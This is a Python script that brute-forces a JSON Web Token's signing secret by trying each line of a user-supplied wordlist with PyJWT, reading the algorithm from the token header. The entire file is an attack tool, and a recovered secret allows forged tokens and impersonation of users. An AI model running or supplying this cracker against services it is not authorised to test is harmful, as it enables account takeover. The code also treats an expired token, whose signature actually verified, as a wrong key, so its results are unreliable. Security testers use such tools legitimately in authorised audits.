import jwt
import base64
import json
from termcolor import colored
import optparse

def get_arguments():
    parser=optparse.OptionParser()
    parser.add_option("-t","--token",dest="token",help="JWT Token")
    parser.add_option("-w","--wordlist",dest="wordlist",help="Wordlist Path")
    (options,arguments)=parser.parse_args()
    if not options.token:
        parser.error("Please specify JWT token or type --help for more info")
    elif not options.wordlist:
        parser.error("Please supply wordlist or type --help for more info")
    return options


def get_algorithm(token):
   # JWT structure: header.payload.signature
   header = token.split('.')[0]
   header_json = base64.urlsafe_b64decode(header + "==") # Decode with padding
   header_data = json.loads(header_json)
   return header_data.get("alg", "HS256") # Default to HS256 if 'alg' is not found

print(colored("Script to brute-force JWT secret token", 'white'))

# Taking token and wordlist from user
options = get_arguments()
token = options.token
secrets_file = options.wordlist
algorithm = get_algorithm(token)

print(colored(f"Detected Algorithm: {algorithm}", 'cyan'))

# Bruteforcing token logic
try:
   with open(secrets_file, 'rb') as secrets: # Open in binary mode
       for secret in secrets:
           try:
               secret_str = secret.decode('utf-8', errors='ignore').rstrip() # Decode line, ignoring errors
               payload = jwt.decode(token, secret_str, algorithms=[algorithm])
               print(colored('[+] Success! Secret Key found: ' + secret_str, 'green'))
               break
           except jwt.ExpiredSignatureError:
               print(colored('Token Expired ....[' + secret_str + ']', 'red'))
           except jwt.InvalidTokenError:
               print(colored('[-] Secret Key is not valid: ' + secret_str, 'red'))
except FileNotFoundError:
   print(colored(f"Error: The file '{secrets_file}' was not found.", 'red'))
